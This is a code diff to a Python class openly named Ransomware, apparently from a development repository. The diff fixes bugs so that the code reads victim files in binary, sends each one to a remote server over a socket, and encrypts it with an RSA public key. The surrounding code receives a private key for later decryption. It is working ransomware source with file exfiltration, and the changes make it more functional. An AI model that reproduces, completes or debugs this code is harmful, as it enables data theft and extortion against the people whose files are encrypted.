@@ -67,7 +67,7 @@ class Ransomware:
     def send_file_to_server(self, file_path, filename):
             
         """ Opening and reading the file data. """
-        file = open(file_path, "r")
+        file = open(file_path, "rb")
         data = file.read()
 
         """ Sending the filename to the server. """
@@ -168,10 +168,10 @@ class Ransomware:
                 # Send file to server
                 self.send_file_to_server(file_path, file)
         
-        self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
+                self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
-        # Encrypt file
-        self.encrypt_file(file_path, key)
+                # Encrypt file
+                self.encrypt_file(file_path, key)
 
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
@@ -223,7 +223,6 @@ class Ransomware:
         #Read the public key from the server
         with open("public_key.pem", "rb") as key_content:
             key = rsa.PublicKey.load_pkcs1(key_content.read())
-
 
         #Encrypt all files
         # t1 = threading.Thread(target=self.encrypt_and_send_all_files(), args=(self._directory, key))
@@ -277,16 +276,16 @@ class Ransomware:
             print(f"[RECV] Receiving the private key data.")
             key.write(data)
             self._socket.sendall("File data received".encode("utf-8"))
-            
+        
+            """ Closing the file. """
+            key.close()
+
             #Read the private key from the server
             #I am not sure where to put this above, so I will leave it here for now
             with open("private_key.pem", "rb") as key_content:
                 key = rsa.PrivateKey.load_pkcs1(key_content.read())
         
-            # decrypt_all_files(home, key)
-        
-            """ Closing the file. """
-            key.close()
+            # self.decrypt_all_files(home, key)
         
             #TODO: Implement code to delete all the files that are stored on the server
 
